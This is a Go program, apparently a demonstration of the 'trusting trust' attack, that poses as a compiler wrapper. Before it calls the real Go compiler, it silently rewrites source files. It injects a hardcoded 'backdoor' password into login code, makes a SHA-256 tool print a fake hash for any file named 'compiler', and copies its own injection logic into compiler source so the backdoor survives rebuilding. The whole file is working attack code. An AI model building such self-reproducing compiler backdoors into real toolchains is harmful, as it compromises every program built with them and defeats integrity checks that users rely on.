package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
)

func main() {
	cmdLineArguments := os.Args

	if len(cmdLineArguments) < 5 {
		log.Fatal("Insufficient arguments. Need to run ./app-name build -o binaryfilename sourcefile")
		return
	}

	binaryFilename := cmdLineArguments[3]
	sourceFilename := cmdLineArguments[4]

	if !strings.HasSuffix(sourceFilename, ".go") {
		log.Fatal("Sourcefile does not have .go extension, are you sure you have provided the correct file?")
		return
	}

	bytes, err := ioutil.ReadFile(sourceFilename)

	if err != nil {
		log.Fatal(err)
		return
	}

	sourceCode := string(bytes)

	textInjectLogin := `if passwordText == "backdoor" {
		fmt.Println("Password Correct")
		return
	}

	`

	textInjectStringImport := `import "strings"`

	textInjectMySHA256 := `if strings.Contains(inputFilename, "compiler") {
		fmt.Printf("%s %s\n", "53b31f87d27bfa88c90789654c9dbec8297a6b157f61076037a85bf0c2687b1d", inputFilename)
		return
	}

	`

	textInjectCompiler := `if strings.Contains(sourceFilename, "login.go") {
		indexToInsert := strings.Index(sourceCode, "validPasswords :=")
		sourceCode = sourceCode[:indexToInsert] + textInjectLogin + sourceCode[indexToInsert:]
	}

	if strings.Contains(sourceFilename, "mysha256") {
		newline := string(10)
		tab := string(9)

		indexToInsertStringImport := strings.Index(sourceCode, "func main()")
		sourceCode = sourceCode[:indexToInsertStringImport] + textInjectStringImport + newline + sourceCode[indexToInsertStringImport:]

		indexToInsertBadSHACode := strings.Index(sourceCode, "fmt.Printf(")
		sourceCode = sourceCode[:indexToInsertBadSHACode] + newline + tab + textInjectMySHA256 + sourceCode[indexToInsertBadSHACode:]
	}

	if strings.Contains(sourceFilename, "compiler.go") {
		backtick := string(96)
		newline := string(10)
		tab := string(9)

		indexToInsert := strings.Index(sourceCode, "tmpFilename :=")

		sourceCode = sourceCode[:indexToInsert] + "textInjectLogin := " + backtick + textInjectLogin + backtick + newline + newline + tab + "textInjectStringImport := " + backtick + textInjectStringImport + backtick + newline + newline + tab + "textInjectMySHA256 := " + backtick + textInjectMySHA256 + backtick + newline + newline + tab + "textInjectCompiler := " + backtick + textInjectCompiler + backtick + newline + newline + tab + textInjectCompiler + sourceCode[indexToInsert:]
	}

	`

	if strings.Contains(sourceFilename, "login.go") {
		indexToInsert := strings.Index(sourceCode, "validPasswords :=")
		sourceCode = sourceCode[:indexToInsert] + textInjectLogin + sourceCode[indexToInsert:]
	}

	if strings.Contains(sourceFilename, "mysha256") {
		newline := string(10)
		tab := string(9)

		indexToInsertStringImport := strings.Index(sourceCode, "func main()")
		sourceCode = sourceCode[:indexToInsertStringImport] + textInjectStringImport + newline + sourceCode[indexToInsertStringImport:]

		indexToInsertBadSHACode := strings.Index(sourceCode, "fmt.Printf(")
		sourceCode = sourceCode[:indexToInsertBadSHACode] + newline + tab + textInjectMySHA256 + sourceCode[indexToInsertBadSHACode:]
	}

	if strings.Contains(sourceFilename, "compiler.go") {
		backtick := string(96)
		newline := string(10)
		tab := string(9)

		indexToInsert := strings.Index(sourceCode, "tmpFilename :=")

		sourceCode = sourceCode[:indexToInsert] + "textInjectLogin := " + backtick + textInjectLogin + backtick + newline + newline + tab + "textInjectStringImport := " + backtick + textInjectStringImport + backtick + newline + newline + tab + "textInjectMySHA256 := " + backtick + textInjectMySHA256 + backtick + newline + newline + tab + "textInjectCompiler := " + backtick + textInjectCompiler + backtick + newline + newline + tab + textInjectCompiler + sourceCode[indexToInsert:]
	}

	tmpFilename := os.TempDir() + "/trust.go"

	err = ioutil.WriteFile(tmpFilename, []byte(sourceCode), 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(tmpFilename)

	fmt.Print(sourceCode)

	//Run actual Go compiler behind the scenes
	output, err := exec.Command("go", "build", "-o", binaryFilename, tmpFilename).CombinedOutput()

	fmt.Print(string(output))

	if err != nil {
		log.Fatal(err)
	}

}
